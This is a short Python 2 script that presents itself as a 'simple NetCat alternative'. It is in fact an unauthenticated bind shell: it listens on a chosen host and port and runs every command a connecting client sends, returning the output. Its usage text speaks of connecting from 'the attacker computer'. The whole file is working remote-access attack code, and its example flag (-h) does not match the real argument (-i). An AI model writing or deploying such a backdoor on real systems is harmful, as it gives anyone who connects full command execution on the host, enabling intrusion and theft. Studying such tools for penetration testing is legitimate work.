#!/usr/bin/env python2
#-*- coding: utf-8 -*-
#  - python2 version
## @author: Danilo Basanta - https://www.linkedin.com/in/danilobasanta/ -


from __future__ import with_statement
from __future__ import absolute_import
import argparse
import shlex
import socket
import subprocess
import sys
import textwrap
import threading


def valid_ip(address):
    try:
        host_bytes = address.split(u'.')
        valid = [int(b) for b in host_bytes]
        valid = [b for b in valid if b >= 0 and b <= 254]
        return len(host_bytes) == 4 and len(valid) == 4
    except IndexError:
        return False


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return False
    else:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()


class NetCat(object):
    def __init__(self, arguments):
        self.arguments = arguments
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except socket.error, msg:
            sys.exit(1)

    def run(self):
        if valid_ip(self.arguments.host):
            if isinstance(self.arguments.port, int):
                if 1 <= self.arguments.port <= 65535:
                    try:
                        self.server.bind((self.arguments.host, self.arguments.port))
                        self.server.listen(20)
                        print '[+] LISTEN'

                        while True:
                            client_socket, address = self.server.accept()
                            client_thread = threading.Thread(target=self.connection_handler, args=(client_socket,))
                            client_thread.start()

                    except socket.error, msg:
                        sys.exit(1)

                else:
                    sys.exit(1)

            else:
                sys.exit(1)

        else:
            sys.exit(1)

    def connection_handler(self, client_connection):
        socket_client = client_connection
        cmd_buffer = ''

        while True:
            try:
                socket_client.send('nc> ')

                while u'\n' not in cmd_buffer.decode():
                    cmd_buffer += socket_client.recv(1024)
                response = execute(cmd_buffer.decode())
                if response:
                    socket_client.send(response.encode())
                cmd_buffer = ''

            except socket.error, e:
                self.server.close()
                sys.exit(1)


if __name__ == u'__main__':
    parser = argparse.ArgumentParser(description=u'Simple NetCat alternative',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent(u'''Example:
    ./netcat.py -h 10.10.10.100 -p 4455
    ./netcat.py -h 10.10.10.100 -p 5555
    
    You can connect to the socket by using netcat or nc in the attacker computer:
        netcat|nc 10.10.10.100 5555
        nc> 
    '''))
    parser.add_argument(u'-i', u'--host', type=unicode, help=u'Host were listen for incoming connections')
    parser.add_argument(u'-p', u'--port', type=int, default=4444, help=u'Port were listen for incoming connections')

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    nc = NetCat(args)
    nc.run()
